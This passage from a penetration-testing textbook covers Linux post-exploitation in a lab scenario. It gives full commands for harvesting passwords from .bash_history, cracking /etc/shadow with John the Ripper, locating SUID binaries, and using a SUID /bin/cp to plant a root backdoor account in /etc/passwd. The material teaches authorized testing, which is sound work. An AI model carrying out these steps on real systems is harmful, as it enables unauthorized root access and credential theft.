some passwords are written in a configuration file and stored in a variable or param-
eter named something other than password—pwd or passwd, for example. Search for
those as well.
165
Harvesting credentials
9.2.1
Harvesting credentials from bash history
By default, all commands entered into a bash prompt are logged in a .dot file named
.bash_history, which is located in the home directory for all users. You can return to
the home directory for the current logged-in user by typing the cd ~/ command.
There you can view the contents of the .bash_history file by typing the command cat
.bash_history. If the file is too long to view in a single terminal window, you can type
cat .bash_history | more, which pipes the output of the cat command into the
more command so you can use the spacebar to scroll through the output one terminal
window at a time. You can see an example in the following listing. Trying this on your
own Linux VM will result in different output, of course, because you have typed differ-
ent commands.
~$ cat .bash_history | more
sudo make install
cd
nmap
nmap -v
clear
ls -l /usr/share/nmap/scripts/
ls -l /usr/share/nmap/scripts/*.nse
ls -l /usr/share/nmap/scripts/*.nse |wc -l
nmap |grep -i scripts
nmap |grep -i update
nmap --script-updatedb
sudo nmap --script-updatedb
cd
cd nmap/
--More--    
So why would you care about the history of commands that have been typed on a
Linux or UNIX system that you’ve compromised? Well, believe it or not, this file is a
common place to find clear-text passwords. If you’ve used Linux or UNIX on the com-
mand line for long enough, I’m sure you have accidentally typed your SSH password
into a bash prompt. I know I have done this many times; it’s a common mistake that
busy humans who are in a hurry often make. 
Listing 9.9
Using cat + more to view .bash_history
Extra credit
Here’s a little assignment to further sharpen your skills. Using your favorite scripting
language or bash, write a simple script to take in a given file path and search all files
recursively through that path for the presence of “password=”, “password:”, “pwd=”,
“pwd:”, “passwd=”, and “passwd:”. 
Here is a big hint: go through the exercise of performing this search manually, make
a note of all the steps you take, and then automate them using a script.
The output is truncated 
based on the height of 
your terminal window.
166
CHAPTER 9
Linux or UNIX post-exploitation
 Another scenario you will find is people typing their passwords on purpose
because the command-line tool they are using—mysql or ldapquery, for example—
accepts clear-text passwords as command-line arguments. No matter the reason, you
should definitely go through the contents of this file for the user account you have
compromised and any other users’ home directories that are readable as part of your
post-exploitation repertoire on Linux and UNIX systems.
9.2.2
Harvesting password hashes
Just as with Windows systems, password hashes for local user accounts can be obtained
if you have root-level access to a Linux or UNIX system. This vector is not as helpful
for gaining access to level-two targets, because Pass-the-Hash is not a viable method of
authenticating to Linux and UNIX systems. Password cracking is a viable option,
albeit typically considered a last resort by most pentesters racing against a clock to
complete an engagement before the deadline. That said, you can locate the password
hashes to a Linux or UNIX system in the /etc/shadow file. (Once again, you need to
have root privileges to access this file.)
 Unlike the SAM registry hive, the /etc/shadow file is just a text file containing raw
hashes, so John the Ripper is familiar with this file. Simply point it at the file to start
cracking by running the following command:
~$ ./john shadow 
The output is similar to the following:
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:./password.lst
0g 0:00:00:05 9.77% 2/3 (ETA: 15:34:33) 0g/s 3451p/s 3451c/s 3451C/s
Panic1..Donkey1
Unfortunately, it’s just as likely that you don’t have root permissions immediately after
compromising a Linux or UNIX target and will need to escalate. There are numerous
paths to explore—more than would be productive to cover in a single chapter. I’m not
going to go over them all. The one I want to show you (because it’s one of my personal
favorites) is identifying and using SUID binary executables to escalate privileges.
9.3
Escalating privileges with SUID binaries
I could write an entire chapter about Linux and UNIX file permissions, but that’s not
the intention of this book. But I want to stress the importance of understanding Set
User ID (SUID) permissions on files, particularly executable files, and how they can
potentially be used on a pentest to elevate privileges on a compromised system.
167
Escalating privileges with SUID binaries
 In a nutshell, executable files are run with the permissions and context of the user
who launched the executable—that is, the user who issued the command. In some
cases, a file must run with elevated privileges. For example, the /usr/bin/passwd
binary, which is used to change your password on Linux and UNIX systems, needs full
root-level permissions to apply changes to user account passwords, but it also needs to
be executable by non-root users. This is where SUID permissions come into play, spec-
ifying that the /usr/bin/passwd binary is owned by the root user and executable by
any user, and that when executed, it will run with the permissions of the root user. 
 The output in listing 9.10 first shows an ls -l command on the /bin/ls execut-
able that does not have SUID permissions. The next output shows the SUID permis-
sions set for /usr/bin/passwd. Notice that the third permission set for /bin/ls is x,
which stands for executable. The owner of the /bin/ls file, which in this case is the root
user, has execute permissions on that binary. In the case of /usr/bin/passwd, you see
an s where the x would be. This is the SUID permission bit, and it tells the OS that this
binary always executes with the permissions of the user who owns it, which in this case
is also the root user.
~$ ls -lah /bin/ls
-rwxr-xr-x 1 root root 131K Jan 18  2018 /bin/ls    
~$ ls -lah /usr/bin/passwd 
-rwsr-xr-x 1 root root 59K Jan 25  2018 /usr/bin/passwd  
From an attacker’s or pentester’s perspective, it may be possible to use this privilege
escalation to elevate access from a non-root user to a root user. In fact, many publicly
documented Linux and UNIX attack vectors take advantage of SUID binaries. One of
the first things to do after you gain access to a Linux or UNIX system is to take inven-
tory of all the SUID binaries your user account has access to. This allows you to
explore the potential for abusing them to gain elevated privileges, which we’ll cover in
the next section. 
9.3.1
Locating SUID binaries with the find command
As you may have already guessed, this potential attack vector is well known to Linux
and UNIX developers, and a great deal of caution has been taken to protect system
binaries like /usr/bin/passwd from being tampered with. If you search Google for
SUID binary privilege escalation, you will find dozens of blog posts and papers document-
ing various examples of what we are about to cover. That said, you probably won’t be
able to use standard binaries such as /usr/bin/passwd for your post-exploitation. 
 As a pentester playing the role of an attacker, the SUID binaries you are most inter-
ested in are nonstandard and have been created or customized by the system adminis-
trators who manage and deployed the system you’ve compromised. Because of the
unique permissions set on SUID binaries, you can locate them easily using the find
Listing 9.10
Normal execute permissions and SUID permissions
Normal execute permissions
SUID permissions
168
CHAPTER 9
Linux or UNIX post-exploitation
command. Run the command find / -perm -u=s 2>/dev/null on your Ubuntu VM,
and the output should look similar to the following. 
~$ find / -perm -u=s 2>/dev/null
/bin/mount
/bin/su
/bin/umount
/bin/fusermount
/bin/ping
*** [OUTPUT TRIMMED] ***
/usr/sbin/pppd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/traceroute6.iputils
/usr/bin/sudo
/usr/bin/arping
/usr/bin/gpasswd
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
It’s good practice to familiarize yourself with standard SUID binaries so you can more
easily spot an outlier if you run across one during a pentest. In the next section, I
cover an example of using a nonstandard SUID binary discovered during the Capsule-
corp pentest to elevate privileges from a non-root user account.
 At this point, you have seen multiple different avenues of gaining unauthorized
access to restricted systems within an enterprise network. So, for this section, we don’t
need to cover the initial penetration. Instead, we will begin with an already compro-
mised Linux system in the Capsulecorp Pentest network.
 During the pentest, it was discovered that a vulnerable web application allowed for
remote code execution, and you have a reverse shell on the target Linux host that was
running the web application. Your shell is running as a non-root user, which means
your access to this machine is heavily restricted. 
 Upon searching the filesystem for nonstandard SUID binaries, the following out-
put was discovered. This is the /bin/cp binary, which is the equivalent of the Windows
copy command, modified with SUID permissions.
Listing 9.11
Using find to search for SUID binaries
169
Escalating privileges with SUID binaries
/bin/mount
/bin/fusermount
/bin/cp.  
/bin/su
/bin/umount
/bin/ping
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/chsh
/usr/bin/newuidmap
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/at
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/ksu
/usr/bin/traceroute6.iputils
As you can see from running the ls -l command on the /bin/cp binary, this binary is
owned by the root user and executable by everyone. Because the SUID permission is
set, it will be possible to use this binary to escalate privileges to that of the root user:
-rwsr-xr-x 1 root root 141528 Jan 18  2018 /bin/cp
9.3.2
Inserting a new user into /etc/passwd
There are many different possibilities that could lead to successful privilege escalation
using a powerful binary such as /bin/cp, and we don’t need to discuss all of them.
The most straightforward approach would be to create a modified passwd file that
contains a new user account that we control, and then use /bin/cp to overwrite the
system file located at /etc/passwd. First, make two copies of the original /etc/passwd
file—one to modify and one to keep as a backup in case you break something:
~$ cp /etc/passwd passwd1
~$ cp /etc/passwd passwd2
Next, use openssl passwd to create a Linux/UNIX-acceptable username and pass-
word hash that can be inserted into your passwd1 file. In this example, I’m creating an
entry for a user named pentest with a password of P3nt3st!:
~$ openssl passwd -1 -salt pentest P3nt3st!
$1$pentest$NPv8jf8/11WqNhXAriGwa.
Now use a text editor to open passwd1, and create a new entry at the bottom. The
entry needs to follow a specific format, shown in the following example.
Listing 9.12
Identifying a nonstandard SUID binary
The /bin/cp binary is 
not SUID by default.
170
CHAPTER 9
Linux or UNIX post-exploitation
~$ vim passwd1
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System 
(admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network 
Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd 
Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
piccolo:x:1000:1000:Piccolo:/home/piccolo:/bin/bash
sssd:x:111:113:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
pentest:$1$pentest$NPv8jf8/11WqNhXAriGwa.:0:0:root:/root:/bin/bash    
-- INSERT –
Don’t be intimidated by this entry in /etc/passwd—it’s easy to follow once you break
it down into seven components separated by colons. The seven components are
described in table 9.1
By specifying the user with a UID and GID of 0 and a home directory of /root, you
have essentially created a backdoor user account with a password that you control who
has full root permissions on the OS. To finalize this attack
1
Overwrite the /etc/passwd file with your modified passwd1 file using the
/bin/cp command. 
Listing 9.13
Modifying /etc/passwd to create a root user account
Table 9.1
The seven components of an /etc/passwd entry
Position
Component
Example
1
Username
pentest
2
Encrypted/Hashed password
$1$pentest$NPv8jf8/11WqNhXAriGwa.
3
User ID
0
4
Group ID
0
5
User’s full name
root
6
User’s home directory
/root
7
Default login shell
/bin/bash
The new entry
containing the
username and
password
generated
from openssl
171
Passing around SSH keys
2
Switch to the pentest user account using the su command. 
3
Run the id -a command, which shows that you now have full root access to the
machine.
You can see these commands in the following listing.
~$ cp passwd1 /etc/passwd 
~$ su pentest 
Password: 
~$ id -a
uid=0(root) gid=0(root) groups=0(root) 
I hope this illustrates the value from an attacker’s perspective of SUID binaries during
Linux and UNIX post-exploitation. Of course, the ability to successfully use an SUID
binary to escalate your privileges depends entirely on what the binary does. The bina-
ries that come standard with SUID permissions probably won’t be viable attack vec-
tors, so familiarize yourself with what they are by using the command illustrated in
listing 9.11. And when you identify a nonstandard SUID binary, try to understand
what it does—if you think creatively, there may be a potential attack vector.
NOTE
Be sure to add this to your engagement notes. This is a configuration
modification and a compromise. You will need to clean this up during post-
engagement, which we will discuss in chapter 11.
9.4
Passing around SSH keys
In some unfortunate cases, you won’t be able to elevate to root on a compromised
Linux or UNIX machine. It still may be possible to use the compromised host as a
pivot point for accessing a level-two system. One way to achieve this is by harvesting
SSH keys from the compromised system and utilizing a tool such as Metasploit or